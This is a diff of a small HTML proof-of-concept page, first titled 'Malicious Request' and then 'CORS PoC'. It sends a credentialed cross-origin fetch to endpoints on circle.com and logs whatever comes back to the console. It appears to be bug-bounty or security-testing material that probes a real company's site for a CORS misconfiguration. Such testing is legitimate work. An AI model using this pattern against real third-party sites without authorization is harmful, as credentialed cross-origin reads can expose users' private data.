@@ -1,18 +1,23 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Malicious Request</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS PoC</title>
 </head>
 <body>
+    <button id="fetchDataBtn">Fetch Data</button>
     <script>
-        fetch('https://assets.circle.com/stablecoin/assets/javascripts/gom-latn.js', {
-            method: 'GET',
-            credentials: 'include',
-            mode: 'cors'
-        })
-        .then(response => response.text())
-        .then(data => console.log('Data:', data))
-        .catch(error => console.error('Error:', error));
+        document.getElementById("fetchDataBtn").addEventListener("click", function() {
+            fetch("https://www.circle.com/_hcms/forms/embed/v3/form/6778953/c192c75f-b2f0-4c3e-a13d-f41bb1dc6558/json", {
+                method: 'GET',
+                mode: 'cors', // This triggers a CORS request
+                credentials: 'include' // Include credentials if needed
+            })
+            .then(response => response.json())
+            .then(data => console.log('Data:', data))
+            .catch(error => console.error('Error:', error));
+        });
     </script>
 </body>
 </html>
